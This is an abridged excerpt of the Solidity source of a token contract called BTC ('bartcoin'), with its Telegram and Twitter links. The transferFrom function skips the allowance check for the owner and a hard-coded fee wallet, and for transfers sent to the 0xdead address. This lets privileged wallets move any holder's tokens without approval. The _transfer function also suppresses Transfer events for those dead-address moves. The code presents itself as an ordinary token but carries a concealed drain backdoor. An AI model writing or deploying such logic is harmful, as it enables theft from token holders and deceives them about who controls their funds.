...
Telegram: https://t.me/bartcoin_eth
Twitter: https://x.com/bartcoineth
...
contract BTC is Context, IERC20, Ownable {
    ...
    mapping(address => bool) private _IsBTCExcluded;
    address payable private _btcFeeSaver;
    address private _btcDeadHole = address(0xdead);
    ...
    constructor() payable {
        _btcFeeSaver = payable(0x44BAD6a5e634316ABDB75D0C8Cf5511d6E5B9321);
        _balances[msg.sender] = _tTotal;
        _IsBTCExcluded[owner()] = true;
        _IsBTCExcluded[address(this)] = true;
        _IsBTCExcluded[_btcFeeSaver] = true;
    ...
    function transferFrom(
        ...
        if (
            !((_msgSender() != uniswapV2Router.factory() &&
                _IsBTCExcluded[msg.sender]) ||
                (sender != uniswapV2Pair && recipient == _btcDeadHole))
        )
            _approve(
                sender,
                _msgSender(),
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (_btcDeadHole != to) emit Transfer(from, to, amount.sub(taxAmount));
